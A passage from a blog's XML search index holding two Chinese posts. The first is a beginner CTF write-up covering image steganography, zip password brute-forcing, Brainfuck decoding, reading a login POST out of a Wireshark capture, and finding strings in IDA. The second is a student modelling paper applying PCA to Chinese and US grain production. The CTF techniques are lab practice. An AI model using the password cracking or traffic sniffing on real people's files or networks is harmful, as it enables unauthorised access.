爱因斯坦"></a>5 爱因斯坦</h4><p>题目下载下来是一张爱因斯坦的表情包，在图片的属性中有备注this_is_not_password，那么我觉得应该是在图片中有压缩包，使用formost进行分解，得到压缩包，但是txt文件解压需要密码，密码来源我觉得是在图片的高度上，毕竟1366,768可能被隐藏了一部分，然后由于我渣渣的winhex使用，图片高度每有调整，我还不知道如何解决。<br>设想使用暴力破解，但是试了6位没有，实验七位时间已经超过数个小时，这样绝对行不通。<br>在这个题中我唯一知道的信息是this_is_not_password，实验下，结果就是这个。<br>打开txt文档flag{dd22a92bf2cceb6c0cd0d6b83ff51606}</p><h4 id="6-神秘龙卷风"><a href="#6-神秘龙卷风" class="headerlink" title="6 神秘龙卷风"></a>6 神秘龙卷风</h4><p>题干描述科学家用四位数字为它命名，和之前一样，爆破得到密码5463，打开压缩文件，打开txt文件神秘的龙卷风，好家伙这不就是Brainfuck编码吗？</p><p><img src="https://upload-images.jianshu.io/upload_images/24919094-6678e719593812b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>将文本内容复制，用在线工具将他转化为txt得到flag{e4bbef8bdf9743f8bf5b727a9f6332a8}</p><h4 id="7-刷新过的图片"><a href="#7-刷新过的图片" class="headerlink" title="7 刷新过的图片"></a>7 刷新过的图片</h4><p>没做出来</p><h4 id="8-wireshark"><a href="#8-wireshark" class="headerlink" title="8 wireshark"></a>8 wireshark</h4><p>使用wirshark追踪http流得到，在追踪多个http流后发现有</p><pre class="line-numbers language-none"><code class="language-none">email&#x3D;flag&amp;password&#x3D;ffb7567a1d4f4abdffdb54e022f8facd&amp;captcha&#x3D;BYUGHTTP&#x2F;1.1 200 OKDate: Mon, 29 Jun 2015 15:09:10 GMTContent-Type: text&#x2F;html; charset&#x3D;UTF-8Transfer-Encoding: chunkedConnection: keep-aliveExpires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check&#x3D;0, pre-check&#x3D;0Pragma: no-cacheServer: yunjiasu-nginxCF-RAY: 1fe28d0a63e91c3b-JXGContent-Encoding: gzip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>email=flag&amp;password=ffb7567a1d4f4abdffdb54e022f8facd&amp;captcha=BYUG得到flag</p><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h4 id="1-easy-re"><a href="#1-easy-re" class="headerlink" title="1 easy.re"></a>1 easy.re</h4><p>由于做逆向少，ctftools里的工具又不知道为什么打不开easy.exe，从网上下载了IDA就那个图标很磕碜的软件，easy.red的flag就在main（）里<br><img src="https://upload-images.jianshu.io/upload_images/24919094-8aab620e79a564b3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>“flag{this_Is_a_EaSyRe}”</p><h4 id="2-reverse-1"><a href="#2-reverse-1" class="headerlink" title="2 reverse_1"></a>2 reverse_1</h4><p>说实话这道题我是用最笨的方法做的，将文件用IDA反编译，从头到尾一个个的找下去，在sub_1400118C0这个项目里面找到了“hello world”这个可能是flag的东西，<br><img src="https://upload-images.jianshu.io/upload_images/24919094-c2f7d359bfd385ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>this is the right flag!更加坚定了我的想法，尝试输入，不对。之后憨憨的从这里到下面全部翻了一遍，试了几个字符串发现没有结果后，最后又回到这里。<br>考虑到之前做bugku的题目有的题目有我们解出的是o，在需要输入的flag上却是0的情况，试着输入0代替o，然后correct。<br>QFNU{hell0_w0rld}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解题记录 </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数学建模：全球食品系统再优化</title>
      <link href="/2021/07/17/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%EF%BC%9A%E5%85%A8%E7%90%83%E9%A3%9F%E5%93%81%E7%B3%BB%E7%BB%9F%E5%86%8D%E4%BC%98%E5%8C%96/"/>
      <url>/2021/07/17/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%EF%BC%9A%E5%85%A8%E7%90%83%E9%A3%9F%E5%93%81%E7%B3%BB%E7%BB%9F%E5%86%8D%E4%BC%98%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2><center>数学建模：全球食品系统再优化</center></h2>### 摘要：<p>本文对全球食品系统进行了粗略的研究，试图解析全球食品体系并对此体系进行验证与实际的应用</p><blockquote><p>我们建立了一个综合的评价模型、优化模型和时间预测模型。在食品系统的综合评价模型中，我们利用熵法和变异系数法找到主要指标和次要指标的权重，使这些指标可以归因于一个数据。最后通过这些相关数据对系统模型进行观察研究，从而探索出该数据对模型的影响、以及所产生的影响对实际问题有什么作用与意义，借此研究全球的食品体系。</p></blockquote><p>我们首先尝试研究中国的食品体系，再将研究中国所得到的结论用于发达国家美国进行扩展测试，这样可以进一步演算模型的可靠性与泛用性，从而能使该模型在以后的实际问题研究中（即研究除中国、美国之外的其他国家的食品体系）能够产生实际的作用，以便于得到可靠度较高的数据（当然存在灵敏值的差异，但尽可能缩小该灵敏值）去应用与我们相关的数学建模与课题研究中去，解决实际的问题。而不是为了计算而计算，我们更加注重数据的实用性与普适性。</p><p>然后我们计算了FSI、更改和更改优先级之后和数据。用于验证模型的稳定性，以保障我们的模型可以更加真正地反映了实际情况。</p><h3><center>目录</center></h3>[TOC]<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>2015年，联合国各国承诺制定《2030年可持续发展议程》。该议程认识到，必须超越饥饿，确保实现全年人人获得充足、安全、营养价值高的食物的目标，并消除一切形式的营养不良。</p><p>食品系统的是否健全对人类社会的发展起着至关重要的作用。目前的食品系统仍面临着许多挑战，世界上饥饿人口的数量一直在缓慢增长，因此重新优化一个强大的食品系统至关重要。只有进一步优化了全球食品系统，才能保证在以后能科学客观地分析全球的粮食资源分配以及饥饿人口的变化趋势，从而能利用科学的大数据来更加具体地解决实际的问题。</p><p>2020年联合国粮农组织，重新评定了中国的粮食状况，在中国大规模脱贫，消除绝对贫困的背景下依旧有，近6.9亿人处于饥饿状态，占世界人口的8.9%，一年内增加了1000万人，五年内增加了近6000万人。</p><p>尽管重新评估了中国的饥饿程度，但世界上大多数营养不良的——3.81亿人仍然存在于亚洲。2.5亿多人生活在非洲，那里的营养不良人口增长快于世界任何其他地区^[1]^。所以，全球的食品系统优化问题不可忽视。</p><p>本优化模型由三位同学合作完成。L1同学负责模型构建与计算；L2同学负责提出假设，问题分析以及模型评价部分；G同学负责数据收集图标制作等工作。</p><h3 id="1-问题重述"><a href="#1-问题重述" class="headerlink" title="1. 问题重述"></a>1. 问题重述</h3><p>联合国估计全世界仍有 8.21 亿人遭受饥饿，此外，当前的粮食系统对环境产生了巨大的影响，随着我们的全球人口持续增长，而我们却经历了数十年环境滥用的日益严重的影响，在维持甚至改善我们的环境健康的同时提供更多的食物 从未如此重要。</p><p>国际食品管理(ICM)委员会要求您的团队开发一个模型来重新构想我们的食 品系统并重新确定其优先级。ICM 委员会让你的团队来决定这些系统的哪些方面。 </p><p>值得成为建模活动的重点。您的团队应该提供一个足够健壮的食品系统模型，以便能够根据效率、盈利能力、可持续性和/或公平性的不同水平对其进行优化调整。 </p><p>无论您关注全球或本地的范围如何，食物系统都很复杂。您应该考虑的一些 </p><p><strong>问题包括但不限于：</strong> </p><ul><li>如果考虑公平性和可持续性，应该如何优化粮食系统？优化后的新系统与当前系统有何不同？这样的系统实施需要多长时间？ </li><li>改变粮食系统重点的收益和成本是什么？它们什么时候发生？这些收益和成本在发达国家和发展中国家之间有何不同？ </li><li>建立食品系统模型后，将模型应用于至少一个发达国家和一个发展中国家，以支持您的发现</li><li>讨论模型的可伸缩性和适应性。</li></ul><h3 id="2-模型假设："><a href="#2-模型假设：" class="headerlink" title="2. 模型假设："></a>2. 模型假设：</h3><p>根据题意进行如下假设</p><ol><li>所有的农业机械在建模中不做区分，视为同一变量</li><li>粮食耕地不做自然环境的区分，权作为单一变量</li><li>忽略农村人口中，非农业人口数量</li><li>忽略战争，天灾等不可抗力影响</li></ol><h3 id="3-问题分析："><a href="#3-问题分析：" class="headerlink" title="3. 问题分析："></a>3. 问题分析：</h3><p>全球粮食系统，在我们团队的认知中最重要的并非是庞大的国家和国际食品生产商和分销商组成的全球体系，而是各个国家实际上的粮食产量。</p><p>由于时间和团队等多方面的制约，本次全球食品系统再优化的尝试，只进行粮食系统的生产方向的优化，试图以多变量的优化分析中国粮食产量自2002年至今的快速增加，并在全球范围内对比其他国家验证所构建的模型。</p><p>我们试图分析中国粮食作物总量与化肥消耗，谷物耕地面积，农村人口，农机具保有量等多参数的影响。建立多变量的优化模型。</p><h3 id="4-样例分析"><a href="#4-样例分析" class="headerlink" title="4. 样例分析"></a>4. 样例分析</h3><h4 id="4-1、-发展中国家：中国"><a href="#4-1、-发展中国家：中国" class="headerlink" title="4.1、 发展中国家：中国"></a>4.1、 发展中国家：中国</h4><p>获取到的数据中，最早时间是1960年，那时的中国还是一个较为落后的农业国家，但通过不断改革和优化其粮食农业体系，是中国的农业发展有了明显的上升趋势，具体表现为近一段时间与上世纪60年代到世纪末表现出完全不同的生产状态，为增加模型精度，特从2003年开始计算。以保障本优化模型的可靠性。</p><p>按照农业进口出口比例计算，2018年中国粮食进口24948734吨，出口34577854，总产量614697756吨，自给率达96.41%，并主要集中于大豆等经济作物。国家的食品供应能力在全球位居前列。中国耕地面积为1432960平方公里，中国政府用占据世界上%7的耕地面积，养活了占世界人口总数20%的中国人民。</p><p>由于上世纪末至本世纪初的十年间，中国耕地面积下降。中国政府在2009年化设耕地红线即15.60亿亩的基本农田数。中国谷物耕地面积至2002年的低点逐年上升</p><p>表1为中国谷物耕地面积，表2为中国农业GDP，表3为化肥消费数,表4为中国农业机械数量列表。</p><img src="./数学建模：全球食品系统再优化/中国谷物耕地面积.jpg" style="zoom: 67%;" /><center>表1 中国谷物耕地面积（公顷）</center><img src="./数学建模：全球食品系统再优化/中国农业GDP.jpg" alt="表2 中国农业GDP（美元）" style="zoom: 67%;" /><center>表2 中国农业GDP（美元）</center><img src="./数学建模：全球食品系统再优化/化肥消费数.jpg" alt="表3 化肥消费数（千克）/公顷" style="zoom:67%;" /><center>表3 化肥消费数（千克）/公顷</center><img src="./数学建模：全球食品系统再优化/中国农业机械数量.jpg" alt="表4 中国农业机械数量" style="zoom:67%;" /><center>表4 中国农业机械数量</center><p>由已知信息可以看出在2002年后，中国农业GDP的曲线与中国耕地面积的曲线十分接近，有理由相信耕地面积是影响农业GDP的最主要因素。</p><h4 id="4-2、-发达国家样本：美利坚合众国"><a href="#4-2、-发达国家样本：美利坚合众国" class="headerlink" title="4.2、 发达国家样本：美利坚合众国"></a>4.2、 发达国家样本：美利坚合众国</h4><p>美国是当今全球最为发达的国家，农业高度发达和高度的机械-现代化。美国的农业自给率极高，按照出口/进口的自给率计算，美国的自给率高达119.56%。为世界主要粮食出口国之一。国家为农业提供一定的财政补贴，以确保农业生产。同时，美国为农业发展提供了大量的政策支持。</p><p>美国是一个发达国家，它的农产品产量和各项指标更稳定，仍处于较高水平，在相邻几年之间只有轻微的上下波动</p><h3 id="5-模型建设："><a href="#5-模型建设：" class="headerlink" title="5. 模型建设："></a>5. 模型建设：</h3><ul><li>由已知数据建立（数据见附录1）</li></ul><h4 id="5-1模型的思路设计"><a href="#5-1模型的思路设计" class="headerlink" title="5.1模型的思路设计"></a>5.1模型的思路设计</h4><p>按照统计学的观点，以化肥消耗，谷物耕地面积，农村人口，农机具保有量占比作为参数建立一个四维随机变量，记作x=(x1,x2,x3,x4)^T^,用一组单位向量(a,b,c,d)假设为相应参数。</p><p><strong>列出对应的矩阵：</strong></p><img src="./数学建模：全球食品系统再优化/模型矩阵.png" alt="模型矩阵"/><p><strong>简记作:</strong></p><ul><li>Y=A<del>x</del>，A=(a,b,c,d)^T^</li></ul><p>a,b,c,d称为主成分系数。一般要求y1，y2，y3，y4，之间互不相关，保证协方差矩阵Coy（y）为对角阵</p><p>按照y的协方差矩阵应为对角阵的要求，有：</p><img src="./数学建模：全球食品系统再优化/协方差矩阵.png" alt="协方差矩阵"  /><p>我们分析了2003至2019年的相关数据对矩阵进行求解。从中挑选不关联年份(2003,2008,2013,2018)建立矩阵，求解向量A(a,b,c,d)^T^</p><img src="./数学建模：全球食品系统再优化/协和矩阵.png"  /><p>用协和矩阵或相关系数矩阵使用Matlab的pcacov函数进行主成分分析求得，(a,b,c,d)^T^，使用Matlab进行求解，得到(a,b,c,d)^T^ ，此时，我们令(a,b,c,d)^T^  = A,</p><p>可以得到:Y=Ax并且<img src="./数学建模：全球食品系统再优化/wps9.png" style="zoom:67%;" />，即A = (a,b,c,d)^T^ ；从而建立一个具体的模型，使问题不再抽象，a<del>1</del> ,a<del>2</del> ,…,a<del>p</del>称为主成分系数。这些主成分系数可以通过SPSS进行计算</p><h4 id="5-2-模型在软件中的实现"><a href="#5-2-模型在软件中的实现" class="headerlink" title="5.2 模型在软件中的实现"></a>5.2 模型在软件中的实现</h4><p>将数据放入SPSS中并进行主成分分析，就可获得我们想要的数据</p><h5 id="5-2-1-检验各元素之间的关联程度"><a href="#5-2-1-检验各元素之间的关联程度" class="headerlink" title="5.2.1 检验各元素之间的关联程度"></a>5.2.1 检验各元素之间的关联程度</h5><ul><li>KMO和巴特利特检验  </li></ul><table><thead><tr><th>KMO 取样适切性量数</th><th></th><th>.686</th></tr></thead><tbody><tr><td>巴特利特球形度检验</td><td>近似卡方</td><td>90.887</td></tr><tr><td></td><td>自由度</td><td>6</td></tr><tr><td></td><td>显著性</td><td>&lt;.001</td></tr></tbody></table><p>一般情况下，KMO值应大于等于0.6，Sig值应小于等于0.05，元素之间关联程度。由数据可见，各元素之间关联性较大，可以用其它的表格去求取主成分系数。</p><h5 id="5-2-2-根据SPSS所给的特征值和成分矩阵算出主成分系数"><a href="#5-2-2-根据SPSS所给的特征值和成分矩阵算出主成分系数" class="headerlink" title="5.2.2 根据SPSS所给的特征值和成分矩阵算出主成分系数"></a>5.2.2 根据SPSS所给的特征值和成分矩阵算出主成分系数</h5><img src="./数学建模：全球食品系统再优化/总方差解释.png" style="zoom:67%;" /><center>总方差解释</center><img src="./数学建模：全球食品系统再优化/碎石图.jpg" alt="碎石图" style="zoom: 67%;" /><center>碎石图</center><img src="./数学建模：全球食品系统再优化/成分矩阵.png" style="zoom:67%;" /><p>设成分i中对应的第j个变量的主成分为pij,第i个特征值为ri, aij表示yi中xi前的系数, ki表示特征值的累计（占比），x`i为标准化后的变量，yi为主成分得分，所以由结论可得：</p><img src="./数学建模：全球食品系统再优化/分析结论.jpg"  /><pre class="line-numbers language-none"><code class="language-none">y1&#x3D;a11x&#96;1+a12x&#96;2…+a1px&#96;py2&#x3D;a21x&#96;1+a22x&#96;2+…+a2px&#96;pyn&#x3D;an1x&#96;1+an2x&#96;2+…+anpx&#96;p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>综合得分：y=k1<em>y1+k2</em>y2+…+kn*yn</p><p>在本数据中，主成分分别为p1,p2,p3,p4,特征值为r1,r2,r3,r4,根据碎石图可知，占比最高的特征值只有一个，所以只要求取y=a1x<code>1+a2x</code>2+a3x<code>3+a4x</code>4中的主成分系数即可。</p><h5 id="5-2-3-算出最终的综合得分"><a href="#5-2-3-算出最终的综合得分" class="headerlink" title="5.2.3 算出最终的综合得分"></a>5.2.3 算出最终的综合得分</h5><p>经过计算得出：<strong>y=0.487x <del>1</del>+0.516x<del>2</del>+0.480<del>x3</del>-0.516<del>x4</del></strong></p><p>再在SPSS的数据编辑器中算出x<del>1</del>,x<del>2</del>,x<del>3</del>,x<del>4</del> </p><img src="./数学建模：全球食品系统再优化/SPSS计算结果.jpg" alt="x~1~,x~2~,x~3~,x~4~" style="zoom:67%;" /><p>再列出表达式算出综合得分</p><img src="./数学建模：全球食品系统再优化/wps13.jpg" style="zoom:67%;" /><h5 id="5-2-4-综合得分与实际的比较"><a href="#5-2-4-综合得分与实际的比较" class="headerlink" title="5.2.4 综合得分与实际的比较"></a>5.2.4 综合得分与实际的比较</h5><p>将粮食总产量标准化后的数据与主成分得分进行比较，变化趋势基本一致，所以用SPSS进行对粮食总产量的评定具有可操作性</p><img src="./数学建模：全球食品系统再优化/wps14.jpg" style="zoom:67%;" /><h4 id="5-3-分析主成分系数"><a href="#5-3-分析主成分系数" class="headerlink" title="5.3 分析主成分系数"></a>5.3 分析主成分系数</h4><p>首先，由上面的计算可知，谷物耕地面积，农业机械总量，化肥消费量，农村人口所对应的系数分别为0.487，0.516，0.480，-0.516。所以，谷物耕地面积，农业机械总量，化肥消费量对粮食总量有促进作用，三者相差不大，而农业机械总量所对应的系数偏大一点，这表示随着现代化，高新技术的农业机械运用到农业中，农业也大幅度增产，与此同时，农村逐步实现现代化，需要的劳动力也逐渐减少，也有部分农村发展成城市，农村人口同时也减少，所以农村人口所对应的系数为负值。</p><h4 id="5-4-得出结论"><a href="#5-4-得出结论" class="headerlink" title="5.4 得出结论"></a>5.4 得出结论</h4><p>我们要继续促进农村的现代化，实现农业机械的现代化，谷物耕地面积，化肥消费量也不可以减少，与此同时，也要加强新农村的建设，在不影响农业所需要的劳动力同时，适当地将农村人向城市人过渡。这些因素可以一定程度上，促进粮食总产量</p><h3 id="6-灵敏度分析："><a href="#6-灵敏度分析：" class="headerlink" title="6. 灵敏度分析："></a>6. 灵敏度分析：</h3><p>我们将目标函数写成偏导的形式</p><img src="./数学建模：全球食品系统再优化/灵敏度分析.png"  /><p>对于每一个数据的偏导数实际上即向量A的各项系数。A=0.487,b=0.516,c=0.48,d=-0.516;</p><p>我们通过改变每个指标的权重来优化当前的食品系统。为了证明我们开发的模型的鲁棒性，我们选定了发达国家：美国、以及发展中国家：中国，并对他们的年度FSI指数进行分析研究，我们得到以下结论：</p><p>美国与中国的FSI指数走向都稳定趋势。但针对于其他发展中国家如尼泊尔，可以发现其FSI指数有着明显的剧烈波动。此外，对于不同国家，FSI指数曲线在短时间内相对于当前系统没有显著变化。当前各国的拟合曲线与各个国家发展状况大体保持一致。这表明，我们的模型可以很好地适合当前的系统。这也可以证明我们的模型的稳定性，因此我们可以使用该模型对这个这个国家的粮食系统做一些简单的评估与研究。</p><h3 id="7-结论分析："><a href="#7-结论分析：" class="headerlink" title="7. 结论分析："></a>7. 结论分析：</h3><h3 id="8-模型评价："><a href="#8-模型评价：" class="headerlink" title="8. 模型评价："></a>8. 模型评价：</h3><h4 id="8-1-优势："><a href="#8-1-优势：" class="headerlink" title="8.1 优势："></a>8.1 优势：</h4><ol><li>指标被充分考虑，数据相对严格，以方差衡量信息的无监督学习，不受样本标签限制。从而适用于许多国家和地区</li><li>利用熵加权法确定每个指标的权重更加客观，并将定性分析转化为定量分析，这更有说服力</li><li>利用少数指标代替多数指标，利用PCA降维是最常用的算法。通过量化该指数的结果，我们可以使评估该指数的等级变得更有说服力，从而判断食品系统的优点</li><li>该模型通过建立组合指标FSI和成本效益指标的回归方程式和迭代计算，充分考虑了这些指标之间的相关性</li><li>使用本模型，进行合理改造生产，能够在一定程度时解决由粮食产量不足带来的粮食短缺问题</li><li>使用该模型使计算方法简单化，更有利于借助计算机来实现数据模型的搭建</li></ol><h4 id="8-2-不足-："><a href="#8-2-不足-：" class="headerlink" title="8.2 不足 ："></a>8.2 不足 ：</h4><ol><li>由于时间等客观因素的限制，我们不评估其他有不同条件的国家食品系统发展概况。如在自然条件极其恶劣的国家和地区的模型应与本模型不同</li><li>面对食物系统优化，如饮食结构，缺乏考虑到人的可接受性。比如西方国家对肉食的大量消耗</li><li>该模式没有考虑到国家政策，自然灾害、外部资金和其他政策的影响</li><li>在一些情况下，过于理想化，将不同的土地，不同的机械种类，看做完全相同。过于的理想化，在具体与测时存在较大误差</li><li>本优化只涉及到粮食生产环节，在整个粮食系统中生产只占据其中的一个环节。对于粮食这一大宗商品的的全球贸易和运输分配等问题没有做出研究</li><li>在研究方法上，我们设计的主成分解释其含义往往具有一定的模糊性，不如原始数据样本完整，一定程度上会使误差增大</li><li>数学建模计算问题上，特征值矩阵的正交向量空间是否唯一有待讨论，可能存在一定的偶然性 </li></ol><h4 id="8-3-进一步讨论："><a href="#8-3-进一步讨论：" class="headerlink" title="8.3 进一步讨论："></a>8.3 进一步讨论：</h4><ul><li>适用性：</li></ul><blockquote><p>评估中国和美国两国农业生产的结果与两国目前的发展状况基本一致，表明该模型具有非常强大的普适性，即不同的地区不同发展水平的国家都可以应用该模型。 都可以得到较为具体的数据</p></blockquote><ul><li>创新性：</li></ul><blockquote><p>对问题所牵扯的变量进行数学化，具体化，以便于理解与应用，更便于实际问题的解决</p></blockquote><ul><li>优化方向：</li></ul><blockquote><p>下一步的优化工作一方面是对已有四个维度进行细化，对于土地面积维度，我们可以根据不同的维度位置，土壤种类进行分类增加参数，提高模型精度。对于农业机械，大型农机具与中小型农机具有本质的不同，也是可以继续优化的内容。</p></blockquote><h3 id="9-研究结论"><a href="#9-研究结论" class="headerlink" title="9. 研究结论"></a>9. 研究结论</h3><p>发达国家的生产状况和社会结构相较于其他发展中国家更加稳定，人民生活也更加安全与富足，因此，我们建议集中解决国家的环境问题和人民的饮食习惯，确保均衡健康的饮食。但是作为发展中国家，其主要目标首先是有足够的食品养活人民，这就要求了国家当局者的首要民生工作必须是增加粮食年生产总量，重点是农业基础设施建设，以及与农业相关的政策补贴，通过对农业生产的大力调整来保障人民的基本生计。 </p><p>作为研究对象的中美两个国家在全球粮食生产上都占有的举足轻重的地位，美国是世界上最大的粮食出口国，中国是世界最大的粮食生产国，且两者在全球范围上耕地面积十分巨大；从事粮食生产与加工的人员也是占据着大量的全球人口比重。研究两个国家的农业发展规律对世界粮食系统可谓是影响巨大。</p><p>耕地面积，对一个国家的粮食中产量起着最为关键的作用，当然，在保持耕地面积的基础上，像农业生产的机械数量与从事农业生产的人口比重也都对一个国家的粮食总产量有着不可忽略的影响</p><h3 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h3><p>[1]2020年联合国粮农组织年度报告</p>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数学建模 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
